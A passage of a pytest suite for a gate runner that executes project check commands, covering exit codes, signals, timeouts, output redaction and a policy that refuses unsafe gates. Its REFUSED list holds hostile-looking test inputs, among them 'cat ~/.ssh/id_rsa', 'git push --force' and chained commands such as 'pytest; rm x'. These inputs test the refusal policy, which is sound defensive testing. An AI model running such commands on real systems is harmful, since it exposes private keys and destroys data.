        P("import sys; sys.exit(255)", id="max"),
        P("import os, signal; os.kill(os.getpid(), signal.SIGKILL)", id="kill"),
        P("import os, signal; os.kill(os.getpid(), signal.SIGTERM)", id="term"),
        P("raise SystemExit", id="bare"),
        P("raise RuntimeError('x')", id="raise"),
    ]
    got = {r.id: (r.status, r.exit_code) for r in run(tmp_path, gates).gates}
    msgs = {r.id: r.message for r in run(tmp_path, gates).gates}
    assert msgs["three"] == "exit code 3" and msgs["kill"] == "killed by signal 9"
    assert msgs["term"] == "killed by signal 15" and msgs["ok"] == ""
    assert got == {
        "ok": ("pass", 0),
        "one": ("fail", 1),
        "three": ("fail", 3),
        "max": ("fail", 255),
        "kill": ("fail", -9),
        "term": ("fail", -15),
        "bare": ("pass", 0),
        "raise": ("fail", 1),
    }


def test_signal_death_message_and_exit_1(tmp_path: Path) -> None:
    report = run(tmp_path, [P("import os, signal; os.kill(os.getpid(), signal.SIGKILL)")])
    assert report.gates[0].message == "killed by signal 9" and exit_code(report) == 1


def test_a_silent_gate_with_exit_0_passes_and_a_noisy_failure_fails(tmp_path: Path) -> None:
    report = run(
        tmp_path,
        [P("pass", id="quiet"), P("import sys; print('all good'); sys.exit(2)", id="liar")],
    )
    assert statuses(report) == ["pass", "fail"]


def test_missing_executable_is_an_error_not_a_pass(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    # A PATH entry the user cannot search (a root-only home) makes execvp report EACCES instead of
    # ENOENT; pin a PATH every user can search so the message is the same everywhere.
    monkeypatch.setenv("PATH", str(tmp_path))
    report = run(tmp_path, [G(argv=("c9-no-such-binary",))])
    assert statuses(report) == ["error"] and report.gates[0].exit_code is None
    assert report.gates[0].message == "executable or folder not found" and exit_code(report) == 1


def test_not_executable_is_an_error(tmp_path: Path) -> None:
    script = tmp_path / "noexec"
    script.write_text("#!/bin/sh\nexit 0\n")
    script.chmod(0o644)
    report = run(tmp_path, [G(argv=(str(script),))])
    assert statuses(report) == ["error"]
    assert report.gates[0].message == "not executable or not permitted"


def test_other_spawn_failures_are_errors_without_the_exception_text(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(*a: Any, **k: Any) -> Any:
        raise OSError(7, "synthetic secret-ish text")

    monkeypatch.setattr(gm, "stream_process", boom)
    report = run(tmp_path, [P("pass")])
    assert statuses(report) == ["error"] and report.gates[0].message == "could not start (OSError)"
    assert "synthetic" not in json.dumps(gm.asdict(report))


def test_unexpected_exception_while_collecting_is_an_error(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(*a: Any, **k: Any) -> Any:
        raise RuntimeError("synthetic")

    monkeypatch.setattr(gm, "collect", boom)
    assert statuses(run(tmp_path, [P("pass")])) == ["error"]


def test_keyboard_interrupt_is_not_swallowed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(*a: Any, **k: Any) -> Any:
        raise KeyboardInterrupt

    monkeypatch.setattr(gm, "collect", boom)
    with pytest.raises(KeyboardInterrupt):
        run(tmp_path, [P("pass")])


def test_missing_exit_status_is_an_error(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(gm, "collect", lambda *a, **k: ExecResult(None, "", "", False, False))
    report = run(tmp_path, [P("pass")])
    assert statuses(report) == ["error"] and report.gates[0].message == "no exit status"


def test_timeout_outranks_an_exit_code_of_zero(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setattr(gm, "collect", lambda *a, **k: ExecResult(0, "x", "", False, True))
    assert statuses(run(tmp_path, [P("pass")])) == ["timeout"]


def test_timeout_keeps_the_output_so_far(tmp_path: Path) -> None:
    code = "import time; print('started', flush=True); time.sleep(30)"
    report = run(tmp_path, [P(code, timeout_s=0.6)])
    assert statuses(report) == ["timeout"] and report.gates[0].stdout_tail == "started\n"
    assert report.gates[0].message == "timed out after 0.6s"


def test_timeout_kills_the_whole_process_group(tmp_path: Path) -> None:
    marker = tmp_path / "grandchild-ran"
    grandchild = (
        "import sys, time, pathlib; time.sleep(2); pathlib.Path(sys.argv[1]).write_text('x')"
    )
    parent = (
        "import subprocess, sys, time\n"
        f"subprocess.Popen([sys.executable, '-c', {grandchild!r}, sys.argv[1]])\n"
        "time.sleep(60)\n"
    )
    report = run(tmp_path, [G(argv=(PY, "-c", parent, str(marker)), timeout_s=0.5)])
    assert statuses(report) == ["timeout"]
    time.sleep(3)
    assert not marker.exists()


def test_a_daemonised_grandchild_holding_the_pipe_is_a_timeout_not_a_pass(tmp_path: Path) -> None:
    parent = (
        "import subprocess, sys\n"
        "subprocess.Popen([sys.executable, '-c', 'import time; time.sleep(60)'])\n"
    )
    report = run(tmp_path, [P(parent, timeout_s=0.6)])
    assert statuses(report) == ["timeout"] and not report.ok


def test_every_gate_runs_after_a_failure(tmp_path: Path) -> None:
    gates = [
        P("import sys; sys.exit(1)", id="first"),
        P(f"open({str(tmp_path / 'second')!r}, 'w').close()", id="second"),
        P("import time; time.sleep(30)", id="third", timeout_s=0.3),
        P(f"open({str(tmp_path / 'fourth')!r}, 'w').close()", id="fourth"),
    ]
    report = run(tmp_path, gates)
    assert statuses(report) == ["fail", "pass", "timeout", "pass"]
    assert (tmp_path / "second").exists() and (tmp_path / "fourth").exists()
    assert (report.passed, report.failed, report.total, report.ok) == (2, 2, 4, False)
    assert exit_code(report) == 1


def test_all_pass_is_ok_and_exit_0(tmp_path: Path) -> None:
    report = run(tmp_path, [P("pass", id="a"), P("print(1)", id="b")])
    assert (report.passed, report.failed, report.total, report.ok) == (2, 0, 2, True)
    assert exit_code(report) == 0


def test_a_single_failure_among_many_passes_is_not_ok(tmp_path: Path) -> None:
    gates = [P("pass", id=f"p{i}") for i in range(4)] + [P("import sys; sys.exit(9)", id="bad")]
    report = run(tmp_path, gates)
    assert (report.passed, report.failed, report.ok) == (4, 1, False) and exit_code(report) == 1


def test_duplicate_ids_never_swallow_a_gate(tmp_path: Path) -> None:
    report = run(tmp_path, [P("pass", id="same"), P("import sys; sys.exit(1)", id="same")])
    assert statuses(report) == ["pass", "fail"] and report.total == 2 and not report.ok


# --- policy errors spawn nothing, and later gates do not run ------------------------------


REFUSED = [
    G("bad", command="pytest; rm x"),
    G("bad", command="pytest 'unbalanced"),
    G("bad", command=""),
    G("bad", argv=()),
    G("bad", argv=("-x",)),
    G("bad", argv=("A=b", "x")),
    G("bad", argv=("git", "push", "--force")),
    G("bad", argv=("cat", os.path.expanduser("~/.ssh/id_rsa"))),
    G("bad", argv=("echo",), cwd=".."),
    G("bad", command="echo a && echo b", shell=True),
    G("bad", argv=("sh", "-c", "echo A; echo B > out.txt")),
    G("bad", command="bash -c ls"),
    G("bad", argv=("env", "sh", "-c", "a;b")),
]


@pytest.mark.parametrize("position", ["first", "middle", "last"])
@pytest.mark.parametrize("bad", REFUSED, ids=lambda g: f"{g.command or g.argv}"[:40])
def test_a_refused_gate_spawns_nothing_and_skips_every_gate(
    tmp_path: Path, spy: Spy, bad: Gate, position: str
) -> None:
    spy.block = True
    marker = tmp_path / "ran"
    good = [P(f"open({str(marker)!r}, 'w').close()", id=f"good{i}") for i in range(2)]
    gates = {"first": [bad, *good], "middle": [good[0], bad, good[1]], "last": [*good, bad]}[
        position
    ]
    report = run(tmp_path, gates)
    assert [r.status for r in report.gates if r.id == "bad"] == ["policy-error"]
    assert [r.status for r in report.gates if r.id != "bad"] == ["not-run", "not-run"]
    assert spy.calls == [] and not marker.exists()
    assert not report.ok and report.passed == 0 and exit_code(report) == 2
    assert [r.id for r in report.gates] == [g.id for g in gates]


def test_two_refused_gates_are_both_reported(tmp_path: Path, spy: Spy) -> None:
    spy.block = True
    report = run(tmp_path, [G("a", command="x; y"), P("pass", id="b"), G("c", command="'")])
    assert statuses(report) == ["policy-error", "not-run", "policy-error"]
    assert report.gates[0].message != report.gates[2].message and spy.calls == []


def test_refused_gates_never_run_even_if_the_flag_is_on(tmp_path: Path, spy: Spy) -> None:
    spy.block = True
    report = run(tmp_path, [G(command="a; b", shell=False)], allow_shell=True)
    assert statuses(report) == ["policy-error"] and spy.calls == []


# --- time bounds -------------------------------------------------------------------------


def test_total_budget_spent_means_not_run_never_pass(tmp_path: Path, spy: Spy) -> None:
    report = run(tmp_path, [P("pass", id="a"), P("pass", id="b")], total_s=0)
    assert statuses(report) == ["not-run", "not-run"] and spy.calls == []
    assert not report.ok and exit_code(report) == 1


def test_total_budget_caps_the_running_gate_and_skips_the_rest(tmp_path: Path) -> None:
    start = time.monotonic()
    gates = [P("import time; time.sleep(8)", id="slow", timeout_s=30), P("pass", id="after")]
    report = run(tmp_path, gates, total_s=1.0)
    assert statuses(report) == ["timeout", "not-run"]
    assert time.monotonic() - start < 6
    assert report.gates[0].message == "timed out after 1s" or report.gates[0].message.startswith(
        "timed out after 0."
    )
    assert exit_code(report) == 1


def test_a_generous_budget_changes_nothing(tmp_path: Path) -> None:
    report = run(tmp_path, [P("pass", id="a"), P("pass", id="b")], total_s=60)
    assert report.ok


def test_per_gate_timeout_is_the_smaller_of_gate_and_remaining(tmp_path: Path) -> None:
    report = run(tmp_path, [P("import time; time.sleep(8)", timeout_s=0.5)], total_s=60)
    assert statuses(report) == ["timeout"] and report.gates[0].message == "timed out after 0.5s"


# --- output capture, redaction, truncation -----------------------------------------------


def test_tails_are_redacted(tmp_path: Path) -> None:
    code = f"import sys; print({ANT!r}); print({ANT!r}, file=sys.stderr); sys.exit(1)"
    r = run(tmp_path, [P(code)]).gates[0]
    assert (
        "[REDACTED:anthropic-key]" in r.stdout_tail and "[REDACTED:anthropic-key]" in r.stderr_tail
    )
    assert "FAKE0" not in r.stdout_tail + r.stderr_tail


def test_redaction_happens_before_the_tail_is_cut(tmp_path: Path) -> None:
    code = f"import sys; sys.stdout.write('y' * 100 + '\\n' + {ANT!r} + '\\n' + 'z' * 3989)"
    r = run(tmp_path, [P(code)]).gates[0]
    assert "FAKE0" not in r.stdout_tail and r.truncated and len(r.stdout_tail) == 4000


@pytest.mark.parametrize(("n", "cut"), [(3999, False), (4000, False), (4001, True), (4002, True)])
def test_tail_boundary(tmp_path: Path, n: int, cut: bool) -> None:
    r = run(tmp_path, [P(f"import sys; sys.stdout.write('x' * {n} )")]).gates[0]
    assert r.truncated is cut and len(r.stdout_tail) == min(n, 4000)


def test_stderr_tail_is_cut_too(tmp_path: Path) -> None:
    r = run(tmp_path, [P("import sys; sys.stderr.write('e' * 4001)")]).gates[0]
    assert r.truncated and len(r.stderr_tail) == 4000 and r.stdout_tail == ""


def test_huge_output_is_bounded(tmp_path: Path) -> None:
    code = "import sys; sys.stdout.write('x' * 3_000_000); sys.stderr.write('e' * 1_000_000)"
    start = time.monotonic()
    r = run(tmp_path, [P(code)]).gates[0]
    assert r.status == "pass" and len(r.stdout_tail) == 4000 and len(r.stderr_tail) == 4000
    assert r.truncated and time.monotonic() - start < 30


def test_capture_truncation_counts_even_when_redaction_shrinks_the_text(tmp_path: Path) -> None:
    code = "import sys; sys.stdout.write('y' * 5000 + '\\n' + 'sk-' + 'A1' * 31_500)"
    r = run(tmp_path, [P(code)]).gates[0]
    assert r.truncated and "A1A1" not in r.stdout_tail and "[REDACTED:openai-key]" in r.stdout_tail
    assert len(r.stdout_tail) < 4000


def test_short_output_is_kept_whole_and_not_truncated(tmp_path: Path) -> None:
    r = run(tmp_path, [P("print('A' * 100)")]).gates[0]
    assert r.stdout_tail == "A" * 100 + "\n" and r.truncated is False


def test_invalid_utf8_output_does_not_crash(tmp_path: Path) -> None:
    r = run(tmp_path, [P("import sys; sys.stdout.buffer.write(b'a\\xff\\xfeb')")]).gates[0]
    assert r.status == "pass" and r.stdout_tail == "a\ufffd\ufffdb"
    json.dumps(gm.asdict(run(tmp_path, [P("pass")])))


# --- report schema and the CLI ------------------------------------------------------------


def test_report_schema_and_key_order(capsys: pytest.CaptureFixture[str], tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "print('needle-in-argv')"]}))
    assert main([str(gf), "--root", str(tmp_path)]) == 0
    out = json.loads(capsys.readouterr().out)
    assert list(out) == ["schema_version", "kind", "gates", "passed", "failed", "total", "ok"]
    assert out["schema_version"] == 1 and out["kind"] == "gates" and out["ok"] is True
    assert list(out["gates"][0]) == [
        "id", "status", "exit_code", "duration_s", "stdout_tail", "stderr_tail", "truncated", "message",
    ]  # fmt: skip
    row = out["gates"][0]
    assert row["id"] == "a" and row["status"] == "pass" and row["exit_code"] == 0
    assert isinstance(row["duration_s"], float) and row["stdout_tail"] == "needle-in-argv\n"
    dumped = json.dumps({k: v for k, v in out.items() if k != "gates"})
    assert "needle" not in dumped and "command" not in out["gates"][0]


def test_the_report_never_contains_the_command_or_the_env(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("GATETEST_API_KEY", "zq-env-secret-value")
    gf = write(
        tmp_path, doc({"id": "a", "argv": [PY, "-c", "import sys; sys.exit(4)", "needle-arg"]})
    )
    assert main([str(gf), "--root", str(tmp_path)]) == 1
    text = capsys.readouterr().out
    assert "needle-arg" not in text and "zq-env-secret-value" not in text and PY not in text


def test_policy_error_report_exit_2(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, spy: Spy
) -> None:
    spy.block = True
    gf = write(tmp_path, doc({"id": "a", "command": "pytest -q"}, {"id": "b", "command": "x | y"}))
    assert main([str(gf), "--root", str(tmp_path)]) == 2
    out = json.loads(capsys.readouterr().out)
    assert [g["status"] for g in out["gates"]] == ["not-run", "policy-error"] and out["ok"] is False
    assert spy.calls == []


def test_cli_exit_codes_with_real_processes(tmp_path: Path) -> None:
    ok = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    proc = cli(str(ok), cwd=tmp_path)
    assert proc.returncode == 0 and json.loads(proc.stdout)["ok"] is True
    bad = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "raise SystemExit(5)"]}))
    proc = cli(str(bad), cwd=tmp_path)
    assert proc.returncode == 1 and json.loads(proc.stdout)["gates"][0]["exit_code"] == 5
    refused = write(tmp_path, doc({"id": "a", "command": "x; y"}))
    proc = cli(str(refused), cwd=tmp_path)
    assert proc.returncode == 2 and json.loads(proc.stdout)["gates"][0]["status"] == "policy-error"
    unusable = write_raw(tmp_path, b"{")
    proc = cli(str(unusable), cwd=tmp_path)
    assert proc.returncode == 2 and proc.stdout.startswith("Gate file: ")


@pytest.mark.parametrize("unbuffered", [False, True], ids=["buffered", "unbuffered"])
def test_cli_default_root_is_the_current_folder(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, unbuffered: bool
) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "import os; print(os.getcwd())"]}))
    if unbuffered:
        monkeypatch.setenv("PYTHONUNBUFFERED", "1")
    else:
        monkeypatch.delenv("PYTHONUNBUFFERED", raising=False)
    proc = cli(str(gf), cwd=tmp_path)
    assert proc.returncode == 0
    assert json.loads(proc.stdout)["gates"][0]["stdout_tail"] == str(tmp_path.resolve()) + "\n"


def test_cli_root_flag_sets_the_default_cwd(
    capsys: pytest.CaptureFixture[str], tmp_path: Path
) -> None:
    (tmp_path / "root").mkdir()
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "import os; print(os.getcwd())"]}))
    assert main([str(gf), "--root", str(tmp_path / "root")]) == 0
    row = json.loads(capsys.readouterr().out)["gates"][0]
    assert row["stdout_tail"] == str((tmp_path / "root").resolve()) + "\n"


def test_cli_root_flag_fences_the_gates(capsys: pytest.CaptureFixture[str], tmp_path: Path) -> None:
    (tmp_path / "root").mkdir()
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"], "cwd": ".."}))
    assert main([str(gf), "--root", str(tmp_path / "root")]) == 2
    assert "cwd refused" in capsys.readouterr().out


@pytest.mark.parametrize("which", ["missing", "file"])
def test_cli_bad_root_exit_2(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, which: str
) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    (tmp_path / "f").write_text("x")
    root = tmp_path / ("nope" if which == "missing" else "f")
    assert main([str(gf), "--root", str(root)]) == 2
    out = capsys.readouterr().out
    assert str(tmp_path) not in out and ("does not exist" in out or "not a folder" in out)


def test_cli_allow_shell_flag(capsys: pytest.CaptureFixture[str], tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "command": "echo hi && echo there", "shell": True}))
    assert main([str(gf), "--root", str(tmp_path)]) == 2
    capsys.readouterr()
    assert main([str(gf), "--root", str(tmp_path), "--allow-shell"]) == 0
    assert json.loads(capsys.readouterr().out)["gates"][0]["stdout_tail"] == "hi\nthere\n"


@pytest.mark.parametrize(
    "args", [[], ["a.json", "b.json"], ["a.json", "--baseline", "x"], ["--help-me"]]
)
def test_cli_bad_arguments_exit_2(args: list[str]) -> None:
    with pytest.raises(SystemExit) as exc:
        main(args)
    assert exc.value.code == 2


def test_unexpected_error_is_exit_2_and_never_echoes_the_text(
    capsys: pytest.CaptureFixture[str], tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    def boom(*a: Any, **k: Any) -> Any:
        raise RuntimeError("synthetic-text")

    monkeypatch.setattr(gm, "run_gates", boom)
    gf = write(tmp_path, doc(OK))
    assert main([str(gf), "--root", str(tmp_path)]) == 2
    out = capsys.readouterr().out
    assert out.strip() == "Gates could not run (RuntimeError)."


class BadStdout:
    def __init__(self, exc: BaseException, on: str) -> None:
        self.exc, self.on = exc, on

    def write(self, text: str) -> int:
        if self.on == "write":
            raise self.exc
        return len(text)

    def flush(self) -> None:
        if self.on == "flush":
            raise self.exc


def main_lost(argv: list[str]) -> int:
    """main() with a broken stdout; closes the devnull handle it parks there (no ResourceWarning)."""
    code = main(argv)
    parked = sys.stdout
    if parked is not None and not isinstance(parked, BadStdout):
        parked.close()
    return code


@pytest.mark.parametrize("on", ["write", "flush"])
@pytest.mark.parametrize("outcome", ["pass", "fail", "refused", "unusable"])
def test_a_lost_report_is_exit_2(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, on: str, outcome: str
) -> None:
    rows = {
        "pass": doc({"id": "a", "argv": [PY, "-c", "pass"]}),
        "fail": doc({"id": "a", "argv": [PY, "-c", "raise SystemExit(1)"]}),
        "refused": doc({"id": "a", "command": "x; y"}),
        "unusable": doc(),
    }
    gf = write(tmp_path, rows[outcome])
    monkeypatch.setattr(sys, "stdout", BadStdout(OSError(28, "No space left on device"), on))
    assert main_lost([str(gf), "--root", str(tmp_path)]) == 2


def test_closed_stdout_is_exit_2(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    monkeypatch.setattr(sys, "stdout", None)
    assert main_lost([str(gf), "--root", str(tmp_path)]) == 2


def test_keyboard_interrupt_while_writing_the_report_propagates(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    monkeypatch.setattr(sys, "stdout", BadStdout(KeyboardInterrupt(), "write"))
    with pytest.raises(KeyboardInterrupt):
        main([str(gf), "--root", str(tmp_path)])


@pytest.mark.skipif(not os.path.exists("/dev/full"), reason="needs /dev/full")
def test_full_disk_buffered_stdout_is_exit_2(tmp_path: Path) -> None:
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    env = {**os.environ, "PYTHONPATH": str(SRC)}
    with open("/dev/full", "w") as full:
        code = subprocess.run(
            [PY, "-m", "master_finhub.evals.gates", str(gf)],
            stdout=full, stderr=subprocess.DEVNULL, env=env, cwd=tmp_path, check=False, timeout=60,
        ).returncode  # fmt: skip
    assert code == 2


# --- exit-code mapping, determinism, bounds ----------------------------------------------


def result(status: Any) -> GateResult:
    return GateResult("a", status, None, 0.0, "", "", False, "")


@pytest.mark.parametrize(
    ("statuses_in", "want"),
    [
        (["pass"], 0),
        (["pass", "pass", "pass"], 0),
        (["fail"], 1),
        (["timeout"], 1),
        (["error"], 1),
        (["not-run"], 1),
        (["pass", "fail"], 1),
        (["pass", "not-run"], 1),
        (["policy-error"], 2),
        (["not-run", "policy-error"], 2),
        (["pass", "fail", "policy-error"], 2),
        ([], 1),
    ],
)
def test_status_to_exit_code(statuses_in: list[str], want: int) -> None:
    assert exit_code(gm._report([result(s) for s in statuses_in])) == want


def test_report_counts_only_passes(tmp_path: Path) -> None:
    rep = gm._report([result(s) for s in ("pass", "fail", "timeout", "error", "not-run", "pass")])
    assert (rep.passed, rep.failed, rep.total, rep.ok) == (2, 4, 6, False)


def test_same_file_same_report_apart_from_durations(tmp_path: Path) -> None:
    gates = [P(f"print({i})", id=f"g{i}") for i in range(4)] + [P("raise SystemExit(2)", id="x")]

    def norm() -> list[Any]:
        rep = gm.asdict(run(tmp_path, gates))
        return [{k: v for k, v in g.items() if k != "duration_s"} for g in rep["gates"]]

    assert norm() == norm()


def test_declared_order_is_kept_not_sorted(tmp_path: Path) -> None:
    ids = ["zz", "b", "Z", "a1", "0"]
    report = run(tmp_path, [P("pass", id=i) for i in ids])
    assert [r.id for r in report.gates] == ids
    assert [
        g.id
        for g in load_gate_file(write(tmp_path, doc(*({"id": i, "command": "x"} for i in ids))))
    ] == ids


@pytest.mark.parametrize(
    "shape",
    [
        "a" * 4096,
        "'" * 4095,
        '"' * 4095,
        "\\" * 4095,
        "$(" * 2000,
        " " * 4000 + "x",
        "a " * 2040,
        "a'" * 2040,
        "~/" * 2000,
        "-" * 4096,
        "a=" * 2000,
    ],
)
def test_pathological_commands_are_fast(tmp_path: Path, shape: str) -> None:
    start = time.monotonic()
    got = plan(tmp_path, command=shape)
    assert time.monotonic() - start < 2 and (isinstance(got, (str, Plan)))


@pytest.mark.parametrize("size", [200_000, 1_000_000])
def test_oversized_commands_are_refused_without_parsing(tmp_path: Path, size: int) -> None:
    start = time.monotonic()
    assert plan(tmp_path, command="a " * (size // 2)) == "command is too long"
    assert plan(tmp_path, argv=("echo", "a" * size)) == "argv is too long"
    assert (
        plan(tmp_path, command="echo " + "a" * size, shell=True, allow_shell=True)
        == "command is too long"
    )
    assert time.monotonic() - start < 2


def test_the_module_has_no_regex() -> None:
    assert not hasattr(gm, "re")  # nothing here needs a ReDoS review


def test_runner_contract_is_untouched() -> None:
    assert runner.BUCKETS == ("regressed", "removed", "fixed", "still_failing", "unchanged", "new")
    assert not hasattr(runner, "load_gate_file") and "gates" not in runner.main.__code__.co_varnames


# --- boundaries that need a fake clock, a fake file or an exact byte count -----------------


def test_bad_gate_is_numbered_from_one(tmp_path: Path) -> None:
    p = write(tmp_path, doc(OK, {"id": "b"}))
    with pytest.raises(GateFileError, match="gate 2 "):
        load_gate_file(p)


def test_the_file_read_is_bounded(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    sizes: list[int] = []
    real_open = open

    class ReadSpy:
        def __init__(self, fh: Any) -> None:
            self.fh = fh

        def __enter__(self) -> Self:
            return self

        def __exit__(self, *a: object) -> None:
            self.fh.close()

        def read(self, n: int = -1) -> bytes:
            sizes.append(n)
            return bytes(self.fh.read(n))

    monkeypatch.setattr("builtins.open", lambda *a, **k: ReadSpy(real_open(*a, **k)))
    load_gate_file(write(tmp_path, doc(OK)))
    assert sizes == [gm.MAX_FILE_BYTES + 1]


def test_timeout_values_that_are_not_finite_positive_numbers() -> None:
    for bad in (float("nan"), float("inf"), float("-inf"), 0, 0.0, -1, True, False, "5", None):
        assert gm._timeout(bad) is None
    assert gm._timeout(1) == 1.0 and gm._timeout(1800) == 1800.0


def test_the_tail_is_the_end_of_the_output(tmp_path: Path) -> None:
    r = run(tmp_path, [P("import sys; sys.stdout.write('HEAD' + 'x' * 5000 + 'END')")]).gates[0]
    assert r.stdout_tail.endswith("xxxEND") and "HEAD" not in r.stdout_tail


def test_the_capture_window_is_exactly_64000_bytes(tmp_path: Path) -> None:
    # One 63,003-character secret, so the redacted tail is short and only the capture cut can
    # set the flag: 64,000 bytes in total fits the window, 64,001 does not.
    def code(prefix: int) -> str:
        return f"import sys; sys.stdout.write('y' * {prefix} + '\\n' + 'sk-' + 'A1' * 31_500)"

    fits = run(tmp_path, [P(code(996))]).gates[0]
    cut = run(tmp_path, [P(code(997))]).gates[0]
    assert "[REDACTED:openai-key]" in fits.stdout_tail and fits.truncated is False
    assert "[REDACTED:openai-key]" in cut.stdout_tail and cut.truncated is True


def test_total_budget_boundary_with_a_frozen_clock(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, spy: Spy
) -> None:
    spy.block = True
    monkeypatch.setattr(gm, "time", types.SimpleNamespace(monotonic=lambda: 100.0))
    report = run(tmp_path, [P("pass")], total_s=0)  # remaining is exactly 0: spent
    assert statuses(report) == ["not-run"] and spy.calls == []


def test_durations_are_small_non_negative_numbers(tmp_path: Path) -> None:
    report = run(tmp_path, [P("pass"), P("import time; time.sleep(0.2)", id="b")])
    first, second = (g.duration_s for g in report.gates)
    assert 0 <= first < 5 and 0.15 <= second < 5


def test_the_documented_bounds() -> None:
    assert (gm.MAX_GATES, gm.MAX_FILE_BYTES, gm.MAX_TEXT_CHARS, gm.MAX_ARGV_ITEMS) == (
        50, 262_144, 4096, 256,
    )  # fmt: skip
    assert (gm.DEFAULT_TIMEOUT_S, gm.MAX_TIMEOUT_S, gm.MAX_TOTAL_S) == (300.0, 1800.0, 3600.0)
    assert (gm.TAIL_CHARS, gm.SHELL_PATH, gm.SCHEMA_VERSION) == (4000, "/bin/sh", 1)
    assert gm.SHELL_METACHARS == frozenset(";&|`$<>\n\r")
    assert gm.ROOT_KEYS == {"schema_version", "gates"}
    assert gm.GATE_KEYS == {"id", "command", "argv", "shell", "timeout_s", "cwd"}


def test_non_ascii_output_survives_an_ascii_stdout(tmp_path: Path) -> None:
    code = "import sys; sys.stdout.buffer.write('caf\\u00e9'.encode())"
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", code]}))
    proc = cli(str(gf), cwd=tmp_path, PYTHONIOENCODING="ascii")
    assert proc.returncode == 0 and "caf\\u00e9" in proc.stdout and proc.stdout.isascii()
    assert json.loads(proc.stdout)["gates"][0]["stdout_tail"] == "caf\u00e9"


def test_stream_process_cwd_defaults_to_the_current_folder_and_can_be_set(tmp_path: Path) -> None:
    code = "import os; print(os.getcwd())"
    env = {"PATH": os.environ["PATH"]}
    here = collect(stream_process([PY, "-c", code], env=env, timeout_s=20))
    there = collect(stream_process([PY, "-c", code], env=env, timeout_s=20, cwd=str(tmp_path)))
    assert here.stdout == os.getcwd() + "\n"
    assert there.stdout == str(tmp_path.resolve()) + "\n"


# --- signals sent to the runner itself ---------------------------------------------------------


def _gone(pid: int) -> bool:
    try:
        os.kill(pid, 0)
    except ProcessLookupError:
        return True
    return False


# The runner child must not inherit this process's signal dispositions: a suite started as a
# background job or under nohup has SIGINT or SIGHUP ignored, and an ignored signal is inherited
# across exec. This boot line restores Python's SIGINT handler (SIG_DFL would kill without unwinding) (thread-safe, unlike
# preexec_fn); the runner itself installs its own SIGTERM and SIGHUP handlers.
BOOT = (
    "import runpy, signal, sys; signal.signal(signal.SIGINT, signal.default_int_handler); "
    "sys.argv = ['gates'] + sys.argv[1:]; runpy.run_module('master_finhub.evals.gates', run_name='__main__')"
)
SIG_CODES = {signal.SIGINT: (-2, 130), signal.SIGTERM: (143,), signal.SIGHUP: (129,)}


@pytest.mark.parametrize(
    "sig", [signal.SIGINT, signal.SIGTERM, signal.SIGHUP], ids=lambda s: s.name
)
def test_a_signal_to_the_runner_kills_the_running_gate_and_is_never_a_pass(
    tmp_path: Path, sig: signal.Signals
) -> None:
    ready = tmp_path / "pid"
    child = "import os, sys, time, pathlib; pathlib.Path(sys.argv[1]).write_text(str(os.getpid())); time.sleep(60)"
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", child, str(ready)], "timeout_s": 120}))
    env = {**os.environ, "PYTHONPATH": str(SRC)}
    proc = subprocess.Popen(
        [PY, "-c", BOOT, str(gf)],
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, env=env, cwd=tmp_path,
    )  # fmt: skip
    try:
        deadline = time.monotonic() + 30
        while time.monotonic() < deadline and not (ready.exists() and ready.read_text()):
            time.sleep(0.05)
        pid = int(ready.read_text())
        proc.send_signal(sig)
        out, _ = proc.communicate(timeout=30)
    finally:
        if proc.poll() is None:
            proc.kill()
    time.sleep(0.5)
    gone = _gone(pid)
    if not gone:
        os.kill(pid, signal.SIGKILL)  # never leave a runaway behind, whatever the verdict
    assert gone and out == b"" and proc.returncode not in (0, 1, 2)
    assert proc.returncode in SIG_CODES[sig]


@pytest.mark.parametrize("sig", [signal.SIGTERM, signal.SIGHUP], ids=lambda s: s.name)
def test_the_handlers_unwind_with_128_plus_the_signal_and_are_restored(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, sig: signal.Signals
) -> None:
    def sentinel(signum: int, frame: Any) -> None:
        pass

    seen: list[Any] = []

    def probe(*a: Any, **k: Any) -> Any:
        handler = signal.getsignal(sig)
        seen.append(handler)
        assert callable(handler) and handler is not sentinel
        handler(sig, None)  # what the kernel would do on delivery

    monkeypatch.setattr(gm, "run_gates", probe)
    gf = write(tmp_path, doc({"id": "a", "argv": [PY, "-c", "pass"]}))
    before = signal.signal(sig, sentinel)
    try:
        with pytest.raises(SystemExit) as exc:
            main([str(gf), "--root", str(tmp_path)])
        assert exc.value.code == 128 + sig and len(seen) == 1
        assert signal.getsignal(sig) is sentinel
    finally:
        signal.signal(sig, before)


